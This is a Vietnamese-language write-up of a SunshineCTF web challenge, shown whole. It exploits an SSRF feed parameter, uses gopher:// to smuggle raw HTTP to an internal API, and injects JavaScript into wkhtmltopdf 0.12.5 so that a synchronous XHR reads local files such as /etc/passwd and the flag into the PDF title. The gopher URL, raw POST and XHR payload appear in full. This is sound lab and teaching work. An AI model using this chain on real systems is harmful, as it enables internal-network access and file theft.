# Groundhog Day — Web (Hard)

**Flag:** `sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}` · **Files:** không có · **Instance:** `https://odyssey.web.2026.sunshinectf.games`

## Đề bài

```
The Punxsutawney Orbital Weather Authority has been broadcasting the same forecast
since 1993.

Every reading is fresh. Every date is February 2. The Bureau insists this is fine,
and the groundhog has declined to comment.

Their public console is up. Have a look at where it gets its numbers.
```

## Phân tích ban đầu

Trang gốc chỉ có một form, và form bị comment lại trong HTML. Đoạn comment là bản vẽ của hệ thống:

```html
<!-- ops: console pulls station JSON at boot from http://127.0.0.1:8000/feed.
     override it with feed=<url> when PUNX-1 is down and you need to point at
     a spare station. ... -->
<!-- feed-debug: source=http://127.0.0.1:8000/feed bytes=350 -->
```

`feed=<url>` (GET hoặc POST lên `/`) khiến server gọi URL đó rồi in toàn bộ body vào
`<pre class="tape">`, kèm độ dài body trong comment `feed-debug`. body response trả về nguyên văn,
chỉ bị escape HTML, nên đây là kênh đọc một-một.

Quét nội bộ cho ra đúng hai dịch vụ:

| Mục tiêu | Kết quả |
|---|---|
| `127.0.0.1:5000` | chính console, chỉ có route `/` |
| `127.0.0.1:8000` | "Bureau Archive", API nội bộ |
| `169.254.169.254` | mock GCP metadata của nền tảng |

API nội bộ tự liệt kê mình ở `GET /` (1045 byte):

```
GET  /feed    JSON ngẫu nhiên hoá
GET  /health  "ok"
POST /report  Render an archival PDF from a report body (content, title)
              ... base64 in the `data` field.
NOTE(ops): ... mainly updating from wkhtmltopdf 0.12.5
```

Vòng lặp mục tiêu là `/report`: thân POST được render bằng wkhtmltopdf 0.12.5, bản còn cho phép đọc
file cục bộ. Hai trở ngại đo được chứ không suy ra:

- console luôn phát request bằng GET, nên `/report` trả `405 Method Not Allowed`;
- mock metadata đòi header `Metadata-Flavor: Google`.

Bên ngoài thì container không đi được: một trạm DNS riêng đã dựng để kiểm tra (page đọc được từ
trạm, console thì báo `bytes=0`); sau đó phân biệt được nguyên nhân là resolve được tên nhưng không
nối được TCP. Không có `gopher://` trong từ điển payload nào từng thử, nên hướng này đóng ở bước nhận
diện client.

## Các hướng đã loại

| # | Giả thuyết | Kết |
|---|---|---|
| H2 | `file://` bị chặn vì client không hỗ trợ | SAI; lệnh chặn đến từ allow-list của tác giả, còn chuỗi lỗi in ra là của libcurl |
| H4 | Hai app còn endpoint ẩn | DEAD; quét 139 từ đơn và ~30 path, mọi 405 trả body 153 byte giống nhau nên không có handler ẩn |
| H5 | Có cách biến GET thành POST | DEAD; `?_method`, `X-HTTP-Method-Override`, multipart, JSON body, PUT/PATCH/OPTIONS, routing quirk, 5 giá trị Host, 19 tên tham số đều vô hiệu |
| H9 | Container chịu đọc station do người chơi chủ trì | DEAD; không có egress, TCP bị chặn |
| H10 | Mock metadata chứa cờ | DEAD; smuggle được header thì đọc trọn cây `/computeMetadata/v1/`, bên trong chỉ là GCP chuẩn |
| H14 | `<iframe src="file://...">` render nội dung file | DEAD; file được fetch thật nhưng Qt không vẽ text của subframe, PDF ra 0 text operator |

## Chuỗi khai thác

**Bước 1 - đọc thông báo lỗi của chính ứng dụng để nhận diện client.** Trang lỗi in exception ra
`<p class="fault">...</p>`. Quét 18 lớp lỗi:

```
file://, data:, chu thô   -> unsupported transport for station feed
http:// khong host        -> station unreachable - URL rejected: No host part in the URL
port >= 65536             -> station unreachable - URL rejected: Port number was not a decimal number between 0 and 65535
127.0.0.1:1               -> station unreachable - Failed to connect to 127.0.0.1 port 1 after 0 ms: Could not connect to server
```

Ba dòng sau là văn phong của libcurl; `requests` và `urllib3` không in ra
`Failed to connect to <host> port <n> after <m> ms` hay `URL rejected:`. Hai hệ quả: `file://` chết ở
phép kiểm scheme của tác giả chứ không chết ở client, và `gopher://` lọt qua phép kiểm đó
(`bytes=0`, `lamp--ok`, không có fault nào, tức là kết nối đã được thực hiện).

**Bước 2 - gopher: biến một GET của console thành một request HTTP thô tùy ý.** libcurl xử lý
`gopher://host:port/_<selector>` bằng cách percent-decode selector rồi gửi thẳng xuống socket:

```
gopher://127.0.0.1:8000/_GET%20/health%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
```

Tape trả về cả header lẫn body:

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.13.7
Content-Type: text/plain; charset=utf-8
Content-Length: 3

ok
```

Từ đây có một proxy HTTP thô bên trong container, tự chọn method và header. Cũng từ response này mà
biết stack là Werkzeug 3.1.8 trên Python 3.13.7.

**Bước 3 - POST /report qua proxy đó.**

```
POST /report HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: <n>

content=<h1>Feb 2 Summary</h1>
```

`bytes=11230`, JSON có các khoá `document`, `bytes`, `encoding`, `data`: wkhtmltopdf đã chạy thật. Cùng
khuôn request này thêm `Metadata-Flavor: Google` thì đọc được cây metadata, xác nhận H10 là infra
dùng chung của nền tảng.

**Bước 4 - tìm kênh trả text về phía người đọc.** `<iframe src="file:///etc/passwd">` cho PDF không có
text operator. File vẫn được đọc thật: `file:///ctf/flag.txt` báo `ContentNotFoundError` khi không có
file, còn `/etc/passwd` thì không báo gì. Vấn đề là Qt không vẽ text/plain trong subframe.
`<meta refresh>` và `location=` bị chặn bằng `unknown error`.

`<script>document.title="JSWORKS123"</script>` xuất hiện trong `/Title` của PDF, nên JavaScript chạy
được và metadata là kênh plaintext. UTF-16BE trong `/Title` cũng đỡ phải giải subset font như content
stream.

**Bước 5 - đọc file bằng XHR đồng bộ, ghi kết quả vào `/Title`.**

```html
<script>
var x = new XMLHttpRequest();
x.open("GET", "file:///etc/hostname", false);
x.send();
document.title = "OK:" + x.responseText;
</script>
```

Trả về `OK:d89c16037bd5`, đúng nội dung `/etc/hostname` của container. XHR gọi sang `http://` thì
`NETWORK_ERR`, tức chỉ có local file access. Một chi tiết kỹ thuật: body là form-urlencoded nên dấu
`+` trong chuỗi `"OK:"+x.responseText` bị decode thành dấu cách và làm hỏng cú pháp JS; phải
`quote(content, safe="")` thì cả 5 biến thể probe mới chạy.

**Bước 6 - định vị file cờ.** `/ctf/flag.txt` (đường dẫn mặc định của các bài pwn cùng kỳ) và `/flag`,
`/app/flag.txt`, `/opt/flag.txt` đều `ContentNotFoundError`. `/flag.txt` trả về cờ.

## Flag
```
sun{s1x_m0r3_w33ks_0f_g0ph3r_ssrf}
```

## Reproduce

```bash
python exploit.py                      # đọc /flag.txt, /flag, /ctf/flag.txt theo thứ tự
python exploit.py /etc/passwd          # đọc tuỳ ý file
python analysis/ssrf.py                # 5 probe mở màn, in bytes= và tape
python analysis/gopher.py              # smuggle GET /health và POST /report
python analysis/pdfdump.py sanity      # tự kiểm bộ trích xuất text PDF
```

`exploit.py` chỉ dùng stdlib. `analysis/` giữ thứ tự phân tích thật: `ssrf.py` rồi `gopher.py`,
`gopher2.py`, `js_check.py`, `js_lfi.py`, `pdfdump.py`, `pdfdebug.py`, `readfile.py`. `files/` giữ
`root.html` (comment ops), `station_index.txt` (docs nội bộ), `first_post_report_response.txt`
(phản hồi đầu của `/report`), `sanity.pdf`, `xhr_hostname.pdf`, `lfi__etc_passwd.pdf`, `meta_403.html`,
`canary_reply.html`. Trạm mồi `station-canary-...qoder.website` đã chuyển lại thành private.
